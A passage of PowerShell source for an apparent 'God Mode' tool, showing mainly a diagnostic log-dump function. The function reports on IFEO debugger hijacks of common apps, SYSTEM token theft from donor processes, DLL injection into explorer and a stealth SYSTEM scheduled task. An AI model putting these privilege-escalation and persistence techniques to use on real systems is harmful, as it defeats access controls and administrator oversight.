        } else {
            $sec += "  -> ALL Session>0 SYSTEM donors are PPL-protected/denied. gmproxy cannot steal a session-correct SYSTEM token -> elevation degrades to a current-user launch (the root cause of 'whoami -> admin'). Check SeDebugPrivilege / PPL protection."
        }
    } catch { $sec += "[SYSTEM TOKEN SOURCE probe failed: $_]" }

    # --- G. seclogon (Phase 1 CreateProcessWithTokenW fallback dependency) ---
    try {
        $sec += "----- SECLOGON SERVICE (Phase 1 fallback dependency) -----"
        $svc = Get-Service -Name seclogon -ErrorAction SilentlyContinue
        if ($svc) {
            $sec += "  seclogon: Status=$($svc.Status) StartType=$($svc.StartType)"
            $sec += "  (CreateProcessWithTokenW needs seclogon RUNNING -- Phase 1 born-as-SYSTEM fallback)"
        } else {
            $sec += "  [seclogon service not found]"
        }
    } catch { $sec += "[SECLOGON probe failed: $_]" }

    # --- H. CriticalProcs + shellNames reference (answers the 'critical process' question) ---
    try {
        $sec += "----- CRITICAL-PROCS / SHELL EXEMPTION REFERENCE -----"
        $sec += "  Shells (cmd/powershell/pwsh/ISE) ARE in Start-Monitoring `$CriticalProcs (so the"
        $sec += "  15s periodic scan SKIPS them -- no kill+relaunch), BUT the WMI watcher + 5s"
        $sec += "  polling drains use `$shellNames to EXEMPT shells from the CriticalProcs guard"
        $sec += "  and elevate them in-place (Phase 0). So 'critical' does NOT block shells; the"
        $sec += "  blocker is the monitor not running / not catching them (see LIVE MONITOR +"
        $sec += "  SYSTEM-TEMP LOGS). Removing shells from CriticalProcs would HARM: the 15s scan"
        $sec += "  would kill+relaunch them, losing your session/cwd/history."
    } catch { $sec += "[CRITICAL-PROCS reference failed: $_]" }

    # --- I. Monitor-activity marker scan (admin + SYSTEM-temp logs) ---
    try {
        $sec += "----- MONITOR ACTIVITY MARKER SCAN (admin + SYSTEM temp logs) -----"
        $markerPattern = 'Start-Monitoring|Monitor-ElevateProcess|Monitoring started|Monitor elevated|Phase 0|Phase 1|Phase 2|WMI process creation watcher|GmProxy feedback|loop exception|God Mode is not enabled|Monitor is running as Administrator'
        $logPaths = @()
        if (Test-Path $LogFile) { $logPaths += $LogFile }
        if (Test-Path $DebugLogFile) { $logPaths += $DebugLogFile }
        foreach ($c in $GodModeSystemTempLogCandidates) { if (Test-Path $c) { $logPaths += $c } }
        $sec += "Log paths scanned: $(if ($logPaths.Count -gt 0) { $logPaths -join '; ' } else { '[none found]' })"
        $totalMarkers = 0
        if ($logPaths.Count -gt 0) {
            try {
                $hits = @(Select-String -Path $logPaths -Pattern $markerPattern -ErrorAction SilentlyContinue)
                $totalMarkers = $hits.Count
                $sec += "Total monitor-marker lines: $totalMarkers (showing last 40)"
                foreach ($h in ($hits | Select-Object -Last 40)) {
                    $sec += "  [$($h.Filename)] $($h.Line.Trim())"
                }
                if ($totalMarkers -eq 0) {
                    $sec += "  [NO monitor activity in ANY log -- the monitor has never run (or never logged)."
                    $sec += "   Check SCHEDULED TASKS LastTaskResult + LIVE MONITOR PROCESS above.]"
                }
            } catch {
                $sec += "  [marker scan error: $_]"
            }
        } else {
            $sec += "  [No admin or SYSTEM-temp logs found at all -- God Mode may never have run.]"
        }
    } catch { $sec += "[MONITOR MARKER SCAN failed: $_]" }

    # --- J. Detector B auto-exclude store (which apps gmproxy learned crash as SYSTEM) ---
    try {
        $sec += "----- DETECTOR B AUTO-EXCLUDE STORE -----"
        $sec += "  Store: $GodModeAutoExcludeFile"
        $sec += "  Threshold: 2 SYSTEM crashes (gmproxy.c GM_AUTOEXCLUDE_THRESHOLD) -- an app that"
        $sec += "  crashes/refuses as SYSTEM twice is auto-excluded to a normal-user launch (IFEO hook retained)."
        $sec += "  Reason legend: C=CRASH (non-zero exit)  G=CLEAN-GUI (exit 0 + GUI PE, WinUI/AppX refusal)"
        $sec += "                P=PRE-DROP (install-time browser drop)  A=AppX/Store stub  ?=old/unknown"
        if (-not (Test-Path $GodModeAutoExcludeFile)) {
            $sec += "  [store not present -- no app has crashed as SYSTEM since the last reset (menu [18])]"
        } else {
            $lines = Get-Content -Path $GodModeAutoExcludeFile -ErrorAction SilentlyContinue
            $excluded = 0; $pending = 0; $entries = 0
            if ($lines) {
                foreach ($line in $lines) {
                    if (-not $line) { continue }
                    $parts = $line -split '\|'
                    if ($parts.Count -ge 4) {
                        $entries++
                        $rex = if ($parts[3] -eq '1') { 'EXCLUDED' } else { 'PENDING(count<threshold)' }
                        if ($parts[3] -eq '1') { $excluded++ } else { $pending++ }
                        $rsn = if ($parts.Count -ge 5 -and $parts[4]) { $parts[4] } else { '?' }
                        $sec += "  base=$($parts[0]) count=$($parts[1]) status=$rex reason=$rsn"
                    }
                }
            }
            $sec += "  SUMMARY: $entries entry/entries, $excluded EXCLUDED, $pending PENDING (count<threshold)."
            if ($excluded -gt 0) {
                $sec += "  -> Use menu [18] RESET AUTO-EXCLUDE STORE to retry SYSTEM elevation for the excluded apps."
            } else {
                $sec += "  -> No app is currently excluded; every hooked app still attempts SYSTEM elevation."
            }
        }
        $sec += "  HINT: an app ABSENT from this store never crashed as SYSTEM (it stayed elevated)."
    } catch { $sec += "[DETECTOR B AUTO-EXCLUDE STORE probe failed: $_]" }

    # --- K. TokenOps C# P/Invoke availability (the root-cause probe for "shells
    #     stay admin / whoami -> admin"). If the hardened compile failed (the
    #     concurrent-Add-Type OutOfMemoryException at boot), TokenOps is UNLOADED
    #     -> the monitor's in-place token swap (Phase 0) + born-as-SYSTEM (Phase
    #     1) are skipped -> shells stay admin (Phase 2 service path is the only
    #     fallback). This section reports whether TokenOps is loaded + the stored
    #     compile reason, so the dump self-diagnoses the exact failure without a
    #     manual probe. Fail-open. ---
    try {
        $sec += "----- TOKENOPS P/INVOKE AVAILABILITY -----"
        $tokAvail = $false
        try { $tokAvail = Test-TokenOpsAvailable } catch {}
        $sec += "  Test-TokenOpsAvailable : $tokAvail"
        $tokReason = if ($script:TokenOpsCompileReason) { $script:TokenOpsCompileReason } else { 'not attempted this session' }
        $sec += "  CompileReason          : $tokReason"
        if ($tokAvail) {
            $sec += "  -> TokenOps loaded: the monitor CAN elevate shells in-place (Phase 0 ReplaceProcessTokenForPid) + born-as-SYSTEM (Phase 1 CreateProcessAsSystem)."
        } else {
            $sec += "  -> TokenOps NOT loaded: the monitor CANNOT do in-place / born-as-SYSTEM elevation. Shells stay admin (whoami -> admin) unless the Phase 2 service path (gmproxy) succeeds. This is the root cause of 'shells stay admin after [7]+reboot'."
            $sec += "  REMEDY: re-enable God Mode (option [7]) when NO other enable task is racing (reboot + enable once is cleanest). The hardened compile serializes concurrent compiles via Global\GodModeTokenOpsCompile + retries on OutOfMemoryException, so a clean single enable compiles TokenOps reliably."
        }
    } catch { $sec += "[TOKENOPS AVAILABILITY probe failed: $_]" }

    return ($sec -join "`r`n")
}

function Export-GodModeLogs {
    param([string]$DestinationFolder = (Get-GodModeLogDir))
    Write-DebugLog -FunctionName "Export-GodModeLogs" -Action "ENTRY" -Message "DestinationFolder=$DestinationFolder"
    try {
        $TimeStamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
        $FileName = "GodMode_Dump_$TimeStamp.log"
        $DestPath = Join-Path -Path $DestinationFolder -ChildPath $FileName

        $LogContent = @()
        $Header = @("===== ENTERPRISE DNS LOCKOUT / GOD MODE LOG DUMP =====", "Generated: $(Get-Date)", "Script: $PSCommandPath", "PSVersion: $($PSVersionTable.PSVersion)", "User: $([Environment]::UserName)", "Machine: $([Environment]::MachineName)", "===== MAIN LOG =====")
        $LogContent += $Header -join "`r`n"
        if (Test-Path $LogFile) { $LogContent += Get-Content -Raw -Path $LogFile -ErrorAction SilentlyContinue } else { $LogContent += "[No main log found]" }
        $LogContent += "`r`n===== DEBUG LOG ====="
        if (Test-Path $DebugLogFile) { $LogContent += Get-Content -Raw -Path $DebugLogFile -ErrorAction SilentlyContinue } else { $LogContent += "[No debug log found]" }
        if (Test-Path $GodModeLogFile) { $LogContent += "`r`n===== GOD MODE LOG ====="; $LogContent += Get-Content -Raw -Path $GodModeLogFile -ErrorAction SilentlyContinue }

        # --- SYSTEM-TEMP LOGS: the monitor (Start-Monitoring) runs as SYSTEM via the
        #     stealth scheduled task and logs via Write-Log to $env:TEMP, which as SYSTEM
        #     resolves to C:\Windows\Temp (or the systemprofile AppData\Local\Temp) -- NOT
        #     the admin user's $env:TEMP that the MAIN/DEBUG LOG sections above read. So
        #     the monitor's own "Monitoring started" / "Monitor elevated: cmd PID=..." /
        #     error lines were NEVER collected -- the blind spot that left "shells stay
        #     admin after [7]+reboot" undiagnosable from this dump alone. Collect every
        #     SYSTEM-temp candidate (best-effort, Test-Path guarded); missing paths are
        #     noted. If ALL are empty/missing, the monitor is NOT running as SYSTEM. ---
        $LogContent += "`r`n===== SYSTEM-TEMP LOGS (monitor as SYSTEM) ====="
        $sysTempFound = 0
        foreach ($stPath in $GodModeSystemTempLogCandidates) {
            if (Test-Path $stPath) {
                $sysTempFound++
                $LogContent += "`r`n--- (Source: $stPath) ---`r`n"
                $LogContent += Get-Content -Raw -Path $stPath -ErrorAction SilentlyContinue
            }
        }
        if ($sysTempFound -eq 0) {
            $LogContent += "`r`n[No SYSTEM-temp monitor logs found at any candidate path.]"
            $LogContent += "`r`n  Checked: $($GodModeSystemTempLogCandidates -join ', ')"
            $LogContent += "`r`n  -> The monitor (Start-Monitoring) has NOT run as SYSTEM since boot, or never wrote."
            $LogContent += "`r`n     This is the #1 cause of cmd/powershell staying admin after [7]+reboot."
        }

        # --- MONITOR / SHELL-ELEVATION PATH: live state (flag, tasks, monitor process,
        #     shell owners, token source, seclogon, marker scan) so the dump pinpoints
        #     exactly where the elevation chain breaks. Reuses Test-GodModeActive /
        #     Find-SystemProcessCandidate (same logic the monitor uses). Best-effort. ---
        $LogContent += "`r`n"
        $LogContent += Get-GodModeElevationPathDiagnostics

        # Driver / Hook status
        $LogContent += "`r`n===== DRIVER / HOOK STATUS ====="
        $ScriptRoot = Split-Path $PSCommandPath -Parent
        $DriverDir = Join-Path $ScriptRoot "driver"
        $ProxySrc = Join-Path $DriverDir "gmproxy.exe"
        $HookSrc = Join-Path $DriverDir "gmhook.dll"
        $ProxyDest = Join-Path $GodModeInstallDir "gmproxy.exe"
        $HookDest = Join-Path $GodModeInstallDir "gmhook.dll"
    $BuildLog = Join-Path (Get-GodModeLogDir) "GodMode_DriverBuild.log"

        $LogContent += "`r`nSource gmproxy.exe: $(if (Test-Path $ProxySrc) { 'EXISTS' } else { 'MISSING' }) ($ProxySrc)"
        $LogContent += "`r`nSource gmhook.dll:  $(if (Test-Path $HookSrc)  { 'EXISTS' } else { 'MISSING' }) ($HookSrc)"
        $LogContent += "`r`nInstalled gmproxy.exe: $(if (Test-Path $ProxyDest) { 'EXISTS' } else { 'MISSING' }) ($ProxyDest)"
        $LogContent += "`r`nInstalled gmhook.dll:  $(if (Test-Path $HookDest)  { 'EXISTS' } else { 'MISSING' }) ($HookDest)"

        $IfeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
        # Includes a few Install-IfeoElevation targets (chrome/notepad/regedit/mstsc) plus the
        # deliberately-excluded shells (cmd/powershell) which should read NOT HOOKED by design.
        $TargetApps = @("chrome.exe","firefox.exe","msedge.exe","notepad.exe","cmd.exe","powershell.exe","regedit.exe","mstsc.exe","mmc.exe","perfmon.exe","resmon.exe")
        foreach ($app in $TargetApps) {
            $appPath = Join-Path $IfeoPath $app
            $Debugger = $null
            try {
                if (Test-Path $appPath) {
                    $Debugger = (Get-ItemProperty -Path $appPath -Name "Debugger" -ErrorAction SilentlyContinue).Debugger
                }
            } catch { }
            $LogContent += "`r`n  IFEO [$app]: $(if ($Debugger -and $Debugger -like '*gmproxy*') { 'HOOKED (gmproxy)' } elseif ($Debugger) { 'OTHER DEBUGGER: ' + $Debugger } else { 'NOT HOOKED' })"
        }

        $LogContent += "`r`nexplorer.exe injection status: $(if (Get-Process -Name 'explorer' -ErrorAction SilentlyContinue) { 'explorer RUNNING' } else { 'explorer NOT RUNNING' })"

        if (Test-Path $BuildLog) {
            $LogContent += "`r`n`r`n----- LAST DRIVER BUILD LOG ($BuildLog) -----`r`n"
            $LogContent += Get-Content -Raw -Path $BuildLog -ErrorAction SilentlyContinue
        }

        # gmproxy IFEO proxy diagnostic log: gmproxy mirrors its stderr diagnostics
        # to %TEMP%\gmproxy.log (durable, append) so they survive even when IFEO
        # launches it detached with no console. Same $env:TEMP as $LogFile above,
        # which matches gmproxy's GetTempPathW since both run as the admin user.
        $GmProxyDiagLog = Join-Path $env:TEMP "gmproxy.log"
        $GmHookDiagLog = Join-Path $env:TEMP "gmhook.log"

        # --- SYSTEM-temp gmproxy.log collection (root-cause for IFEO re-entry):
        #     When a launcher/stub child (a Desktop Firefox copy) spawns an IFEO-
        #     hooked image (the real firefox.exe), Windows births a NESTED
        #     gmproxy.exe as the grandchild. That nested gmproxy runs AS SYSTEM
        #     (inheriting the stub's token), so its GetTempPathW resolves to the
        #     SYSTEM temp -- NOT the admin user's $env:TEMP above -- and its
        #     [GM-PROXY] LAUNCH/CHILD-STATUS/ELEVATE lines land in a DIFFERENT
        #     gmproxy.log that the single-path collection below used to miss. The
        #     per-app DELEGATED verdict for the stub is then inconclusive (the
        #     surviving grandchild is gmproxy.exe itself, not the real browser;
        #     gmproxy now tags that recur=yes). Collect both SYSTEM-temp candidates
        #     so the nested gmproxy's own CHILD-STATUS (real app ALIVE/EXITED/
        #     DELEGATED) is aggregated into the per-app report + ELEVATION FAULTS,
        #     resolving the re-entry blind spot. All reads are best-effort
        #     (Test-Path guarded); missing paths are skipped. $GmProxyDiagPaths
        #     holds existing logs only (admin temp first, then SYSTEM-temp).
        $GmProxySystemDiagCandidates = @(
            'C:\Windows\Temp\gmproxy.log',
            'C:\Windows\System32\config\systemprofile\AppData\Local\Temp\gmproxy.log'
        )
        $GmProxyDiagPaths = @()
        if (Test-Path $GmProxyDiagLog) { $GmProxyDiagPaths += $GmProxyDiagLog }
        foreach ($p in $GmProxySystemDiagCandidates) { if (Test-Path $p) { $GmProxyDiagPaths += $p } }

        # --- GM BUILD VERSIONS: at-a-glance identification of the deployed
        #     gmproxy.exe / gmhook.dll build. The C binaries bake in a
        #     compile-time stamp via __DATE__/__TIME__ (changes every recompile)
        #     and write it to %TEMP%\gmproxy.log / %TEMP%\gmhook.log on launch /
        #     DLL load. This section extracts the LAST BUILD line from each log
        #     plus the installed binary LastWriteTime, so a stale vs. freshly
        #     rebuilt binary is identifiable without scrolling the full dumps.
        $LogContent += "`r`n===== GM BUILD VERSIONS ====="
        # gmproxy.exe build stamp + deployed-file timestamp.
        $ProxyBuild = $null
        if ($GmProxyDiagPaths.Count -gt 0) {
            try { $ProxyBuild = (Select-String -Path $GmProxyDiagPaths -Pattern '\[GM-PROXY\] BUILD' -ErrorAction SilentlyContinue | Select-Object -Last 1).Line } catch {}
        }
        $LogContent += "`r`ngmproxy.exe build stamp: $(if ($ProxyBuild) { $ProxyBuild.Trim() } else { '[not yet logged -- gmproxy has not run since deploy]' })"
        if (Test-Path $ProxyDest) {
            $LogContent += "`r`ngmproxy.exe deployed (LastWriteTime): $((Get-Item $ProxyDest).LastWriteTime)"
        } else {
            $LogContent += "`r`ngmproxy.exe deployed (LastWriteTime): [MISSING -- not installed at $ProxyDest]"
        }
        # gmhook.dll build stamp + deployed-file timestamp.
        $HookBuild = $null
        if (Test-Path $GmHookDiagLog) {
            try { $HookBuild = (Select-String -Path $GmHookDiagLog -Pattern '\[GM-HOOK\] BUILD' -ErrorAction SilentlyContinue | Select-Object -Last 1).Line } catch {}
        }
        $LogContent += "`r`ngmhook.dll build stamp: $(if ($HookBuild) { $HookBuild.Trim() } else { '[not yet logged -- gmhook.dll has not been injected/loaded since deploy]' })"
        if (Test-Path $HookDest) {
            $LogContent += "`r`ngmhook.dll deployed (LastWriteTime): $((Get-Item $HookDest).LastWriteTime)"
        } else {
            $LogContent += "`r`ngmhook.dll deployed (LastWriteTime): [MISSING -- not installed at $HookDest]"
        }
        $LogContent += "`r`n(Source logs: $GmProxyDiagLog , $GmHookDiagLog)"
        $LogContent += "`r`nNOTE: the BUILD stamp changes every recompile (__DATE__/__TIME__). If the stamp"
        $LogContent += "`r`n      matches your latest build, the new binary is deployed. If it shows an"
        $LogContent += "`r`n      older stamp or 'not yet logged', the VM is running a stale binary or"
        $LogContent += "`r`n      the binary has not run since the last copy."
        $LogContent += "`r`n===== GM-PROXY DIAGNOSTIC LOG ====="
        $LogContent += "`r`n(Source: $GmProxyDiagLog)"
        if (Test-Path $GmProxyDiagLog) {
            $LogContent += "`r`n"
            $LogContent += Get-Content -Raw -Path $GmProxyDiagLog -ErrorAction SilentlyContinue
        } else {
            $LogContent += "`r`n[No gmproxy log found] (expected at $GmProxyDiagLog)"
        }
        # SYSTEM-temp gmproxy.log dumps (nested SYSTEM gmproxy instances from IFEO
        # re-entry -- a stub spawning a hooked image births a gmproxy grandchild that
        # runs as SYSTEM and logs here, not in the admin temp above). Each existing
        # candidate is dumped under its own source header so the nested gmproxy's
        # BUILD/ELEVATE/TOKEN/CMDLINE/ENV/CREATEPROC/CHILD-STATUS lines are visible
        # and aggregated into the per-app report + ELEVATION FAULTS below.
        foreach ($p in $GmProxySystemDiagCandidates) {
            if (Test-Path $p) {
                $LogContent += "`r`n`r`n--- (Source: $p) ---`r`n"
                $LogContent += Get-Content -Raw -Path $p -ErrorAction SilentlyContinue
            }
        }

        # --- GM-PROXY AUTO-EXCLUDE STORE (Detector B): dump the persistent
        #     SYSTEM-crash auto-exclude store so the user can see which base
        #     names gmproxy has learned to launch as the current user (after
        #     >= threshold SYSTEM crashes) instead of as SYSTEM. Each line:
        #     basename|crashCount|lastCrashUnixTs|excluded|reason. Reset via
        #     menu [18]. reason: C=crash, G=clean-gui, P=pre-drop, ?=old line.
        $LogContent += "`r`n===== GM-PROXY AUTO-EXCLUDE STORE ====="
        if (Test-Path $GodModeAutoExcludeFile) {
            $LogContent += "`r`n(Source: $GodModeAutoExcludeFile)"
            $storeContent = Get-Content -Raw -Path $GodModeAutoExcludeFile -ErrorAction SilentlyContinue
            if ($storeContent) {
                $LogContent += "`r`n"
                $LogContent += $storeContent
            } else {
                $LogContent += "`r`n[Store file exists but is empty]"
            }
        } else {
            $LogContent += "`r`n[No auto-exclude store yet -- no app has crashed as SYSTEM >= threshold, or the store was reset]"
        }
        $LogContent += "`r`nNOTE: an entry with excluded=1 means gmproxy will launch that app as the"
        $LogContent += "`r`n      current user (USER-AUTOEXCLUDE mode) instead of as SYSTEM on its next"
        $LogContent += "`r`n      launch. Entries auto-drop after 30 days or via menu [18] RESET AUTO-EXCLUDE STORE."
        $LogContent += "`r`n      Line format: basename|crashCount|lastCrashUnixTs|excluded|reason"
        # reason legend: the single $reasonLegend hashtable is the source of
        # truth for the auto-exclude reason codes -- it drives this store legend
        # AND the per-app REASON legend below so adding a future code (or
        # rewording a description) updates both in lockstep (no drift). Ordered
        # for a stable, severity-ish listing. Defined here (always reached
        # before the per-app legend) so both emitters see it.
        $reasonLegend = [ordered]@{
            'C' = 'CRASH (non-zero exit as SYSTEM, any subsystem)'
            'G' = 'CLEAN-GUI (exit 0 + GUI PE = a WinUI/AppX silent refusal)'
            'P' = 'PRE-DROP (install-time browser drop)'
            'A' = 'ALIAS-STUB (install-time AppX/Store-redirector drop -- notepad/mspaint/calc/photos; cannot run as SYSTEM + gmproxy rename breaks their Store redirect, so they launch natively as the user via the alias)'
            '?' = 'old 4-field line, or not in the store (reason added after the fact / never excluded / no runtime refusal recorded yet)'
        }
        $reasonParts = foreach ($k in $reasonLegend.Keys) { "$k=$($reasonLegend[$k])" }
        $LogContent += "`r`n      reason: " + ($reasonParts -join ', ')

        # --- GM-PROXY PER-APP LAUNCH REPORT (big debug): aggregates every
        #     gmproxy invocation into a per-app summary so the user can report
        #     exactly which apps launched as SYSTEM vs fell back vs refused vs
        #     failed, and -- crucially -- which apps EXITED within the grace
        #     window (the "launched but instantly died / won't render" signal).
        #     Parsed from the [GM-PROXY] LAUNCH: / [GM-PROXY] CHILD-STATUS:
        #     structured lines gmproxy.c writes to %TEMP%\gmproxy.log.
        $LogContent += "`r`n===== GM-PROXY PER-APP LAUNCH REPORT ====="
        $LogContent += "`r`n(Source: admin-temp + SYSTEM-temp gmproxy.log -- see DIAGNOSTIC LOG section for paths)"
        if ($GmProxyDiagPaths.Count -gt 0) {
            try {
                $launchLines = @(Select-String -Path $GmProxyDiagPaths -Pattern '^\[GM-PROXY\] LAUNCH: ' -ErrorAction SilentlyContinue)
                $childLines  = @(Select-String -Path $GmProxyDiagPaths -Pattern '^\[GM-PROXY\] CHILD-STATUS: ' -ErrorAction SilentlyContinue)
                # DELEGATED = the child exited cleanly (exitcode 0) but left a surviving
                # grandchild whose image IS the real app (recur=no) -- a launcher/stub
                # delegated and the REAL app opened (NOT a failure). DELEGATED-RECUR
                # (recur=yes) = the surviving grandchild is gmproxy.exe itself: IFEO
                # re-entry -- a stub spawned an IFEO-hooked image (e.g. a Desktop Firefox
                # copy spawning the real firefox.exe) and Windows birthed a NESTED gmproxy
                # as the grandchild; the real app's fate is in that nested gmproxy's log
                # (running as SYSTEM -> a SYSTEM-temp gmproxy.log, now collected above).
                $report = @{}
                foreach ($l in $launchLines) {
                    if ($l.Line -match 'app=(.+?) pid=\d+ mode=([\w-]+) ') {
                        $app = $matches[1].Trim(); $mode = $matches[2]
                        $modeKey = $mode -replace '-',''  # USER-AUTOEXCLUDE -> USERAUTOEXCLUDE dict key
                        if (-not $report.ContainsKey($app)) {
                            $report[$app] = @{ Launches=0; SYSTEM=0; FALLBACK=0; REFUSE=0; FAILED=0; ALIVE=0; DELEGATED=0; DELEGATEDRECUR=0; EXITED=0; USERAUTOEXCLUDE=0; UNKNOWN=0 }
                        }
                        $report[$app].Launches++
                        if ($report[$app].ContainsKey($modeKey)) { $report[$app][$modeKey]++ }
                    }
                }
                foreach ($c in $childLines) {
                    if ($c.Line -match 'app=(.+?) pid=\d+ result=(\w+)') {
                        $app = $matches[1].Trim(); $res = $matches[2]
                        $isRecur = $c.Line -match 'recur=yes'
                        if (-not $report.ContainsKey($app)) {
                            $report[$app] = @{ Launches=0; SYSTEM=0; FALLBACK=0; REFUSE=0; FAILED=0; ALIVE=0; DELEGATED=0; DELEGATEDRECUR=0; EXITED=0; USERAUTOEXCLUDE=0; UNKNOWN=0 }
                        }
                        if ($res -eq 'DELEGATED' -and $isRecur) {
                            $report[$app].DELEGATEDRECUR++
                        } elseif ($report[$app].ContainsKey($res)) {
                            $report[$app][$res]++
                        }
                    }
                }
                if ($report.Count -eq 0) {
                    $LogContent += "`r`n[No gmproxy LAUNCH/CHILD-STATUS entries yet -- no IFEO launches recorded]"
                } else {
                    # Build a base->reason map from the auto-exclude store so the
                    # per-app REASON column shows WHY each app was excluded (the
                    # stored 5th field: C/G/P/A/?). Display-only; additive.
                    $reasonMap = @{}
                    if (Test-Path $GodModeAutoExcludeFile) {
                        try {
                            $storeLines = Get-Content -Path $GodModeAutoExcludeFile -ErrorAction SilentlyContinue
                            if ($storeLines) {
                                foreach ($ln in $storeLines) {
                                    if (-not $ln) { continue }
                                    $p = $ln -split '\|'
                                    if ($p.Count -ge 4) {
                                        $rsn = '?'; if ($p.Count -ge 5 -and $p[4]) { $rsn = $p[4] }
                                        $reasonMap[$p[0].ToLower()] = $rsn
                                    }
                                }
                            }
                        } catch {}
                    }
                    $LogContent += "`r`nApp                 Launches  SYSTEM  FALLBACK  REFUSE  FAILED  ALIVE  DELEGATED  EXITED(crash?)  DELEGATED-RECUR  USER-AUTOEXCLUDE  REASON"
                    $LogContent += "`r`n------------------  --------  ------  --------  ------  ------  -----  ---------  -------------  -------------  ---------------  ------"
                    foreach ($app in ($report.Keys | Sort-Object)) {
                        $r = $report[$app]
                        $appReason = $reasonMap[$app.ToLower()]
                        if (-not $appReason) { $appReason = '?' }
                        $LogContent += ("`r`n{0,-18}  {1,8}  {2,6}  {3,8}  {4,6}  {5,6}  {6,5}  {7,9}  {8,13}  {9,13}  {10,15}  {11,-6}" -f $app, $r.Launches, $r.SYSTEM, $r.FALLBACK, $r.REFUSE, $r.FAILED, $r.ALIVE, $r.DELEGATED, $r.EXITED, $r.DELEGATEDRECUR, $r.USERAUTOEXCLUDE, $appReason)
                    }
                    $LogContent += "`r`nNOTE: ALIVE = child still running after the grace window (healthy)."
                    $LogContent += "`r`n      DELEGATED = the child exited cleanly (exitcode 0) but left a surviving"
                    $LogContent += "`r`n      grandchild -- it was a launcher/stub (Desktop Firefox copy, Win11"
                    $LogContent += "`r`n      notepad stub) and the REAL app opened (NOT a failure)."
                    $LogContent += "`r`n      DELEGATED-RECUR (recur=yes) = the surviving grandchild is gmproxy.exe"
                    $LogContent += "`r`n      itself: IFEO re-entry -- a stub spawned an IFEO-hooked image (e.g. the"
                    $LogContent += "`r`n      Desktop Firefox copy spawning the real firefox.exe) and Windows birthed a"
                    $LogContent += "`r`n      NESTED gmproxy as the grandchild. The real app's fate is logged by that"
                    $LogContent += "`r`n      nested gmproxy (running as SYSTEM -> a SYSTEM-temp gmproxy.log, now"
                    $LogContent += "`r`n      collected above); read its CHILD-STATUS for the real verdict."
                    $LogContent += "`r`n      EXITED = the child process exited within ~1.5s with no surviving"
                    $LogContent += "`r`n      descendant. class=CLEAN (exitcode 0) = graceful refusal as SYSTEM;"
                    $LogContent += "`r`n      class=CRASH (exitcode != 0) = the app crashed as SYSTEM."
                    $LogContent += "`r`n      CAVEAT: EXITED class=CLEAN tree=0 (real job, not job=disabled) may ALSO"
                    $LogContent += "`r`n      be a stub that delegated to a grandchild which escaped the job tree"
                    $LogContent += "`r`n      (breakaway / out-of-tree activation -- e.g. Win11 C:\Windows\notepad.exe"
                    $LogContent += "`r`n      -> WinUI Notepad). For known stub apps, confirm visually before treating"
                    $LogContent += "`r`n      CLEAN as a graceful refusal."
                    $LogContent += "`r`n      Report the per-app EXITED(class=CRASH) counts so the IFEO"
                    $LogContent += "`r`n      exclusion can be scoped to exactly the apps that break as SYSTEM."
                    # REASON legend emitted from the same $reasonLegend
                    # hashtable as the store legend above (single source of truth
                    # -- no drift when a future reason code is added).
                    $reasonParts2 = foreach ($k in $reasonLegend.Keys) { "$k=$($reasonLegend[$k])" }
                    $LogContent += "`r`n      REASON column = the stored auto-exclude reason for that app (the"
                    $LogContent += "`r`n      store's 5th field): " + ($reasonParts2 -join ', ') + "."
                }
                # --- ELEVATION FAULTS (root-cause): parse the [GM-PROXY] CREATEPROC:
                #     result=FAIL lines (which CreateProcess method failed + gle) and the
                #     ELEVATE: srckind=none line (no SYSTEM token acquired) so the user
                #     can report the ELEVATION-side root cause alongside the per-app
                #     launch report. The ELEVATE/TOKEN/CMDLINE/ENV/TARGET context lines
                #     (logged once per gmproxy run) are in the raw GM-PROXY DIAGNOSTIC
                #     LOG dump above; this section surfaces just the FAULTS for scanning.
                $LogContent += "`r`n----- ELEVATION FAULTS (root-cause) -----"
                $gmFaultCount = 0
                try {
                    $createFailLines = @(Select-String -Path $GmProxyDiagPaths -Pattern '^\[GM-PROXY\] CREATEPROC: .*result=FAIL' -ErrorAction SilentlyContinue)
                    $noTokenLines   = @(Select-String -Path $GmProxyDiagPaths -Pattern '^\[GM-PROXY\] ELEVATE: srckind=none' -ErrorAction SilentlyContinue)
                    foreach ($f in $createFailLines) {
                        $LogContent += "`r`n  $($f.Line.Trim())"
                        $gmFaultCount++
                    }
                    foreach ($n in $noTokenLines) {
                        $LogContent += "`r`n  $($n.Line.Trim())"
                        $gmFaultCount++
                    }
                } catch {
                    $LogContent += "`r`n[Error parsing elevation faults: $_]"
                }
                if ($gmFaultCount -eq 0) {
                    $LogContent += "`r`n  [No elevation faults recorded -- all CreateProcess attempts succeeded + a SYSTEM token was acquired]"
                }
            } catch {
                $LogContent += "`r`n[Error building per-app launch report: $_]"
            }
        } else {
            $LogContent += "`r`n[No gmproxy log found] (checked: $GmProxyDiagLog + SYSTEM-temp: $($GmProxySystemDiagCandidates -join ', '))"
        }

        # Error summary from debug log
        $ErrorCount = 0
        if (Test-Path $DebugLogFile) {
            $ErrorCount = (Select-String -Path $DebugLogFile -Pattern "\[ERROR\]" -ErrorAction SilentlyContinue | Measure-Object).Count
        }
        $LogContent += "`r`n===== ERROR SUMMARY =====`r`nTotal ERROR entries in debug log: $ErrorCount`r`nDump complete.`r`n"

        if (($LogContent | Measure-Object).Count -eq 0) {
            Write-Host "[WARN] No logs found to dump." -ForegroundColor Yellow
            Write-DebugLog -FunctionName "Export-GodModeLogs" -Action "EXIT" -Message "No logs found"
            return
        }

        $LogContent -join "`r`n" | Out-File -FilePath $DestPath -Encoding UTF8 -Force
        Write-Host "[SUCCESS] Logs dumped to: $DestPath ($ErrorCount error entries captured)" -ForegroundColor Green
        Write-DebugLog -FunctionName "Export-GodModeLogs" -Action "EXIT" -Message "Success: $DestPath, ErrorCount=$ErrorCount"
    } catch {
        Write-DebugLog -FunctionName "Export-GodModeLogs" -Action "ERROR" -Message "Failed to dump logs" -ErrorRecord $_
        Write-Host "[ERROR] Failed to dump logs: $_" -ForegroundColor Red
    }
}

function Test-GmAutoExcluded {
    <#
    .SYNOPSIS
        Detector B store consult: return $true if a base name is currently
        auto-excluded (gmproxy recorded it refusing/crashing as SYSTEM >=
        GM_AUTOEXCLUDE_THRESHOLD times). Used by the monitor's elevation entry
        points to SKIP re-elevating an app the runtime store learned is SYSTEM-
        incompatible -- defense-in-depth alongside gmproxy's A3 (no feedback
        handoff for autoExcluded) and gmhook's B2 (no SYSTEM birth for excluded
        bases). Fail-open: a missing/corrupt/ACL-denied store -> $false -> normal
        elevation (never blocks elevation on a store error).
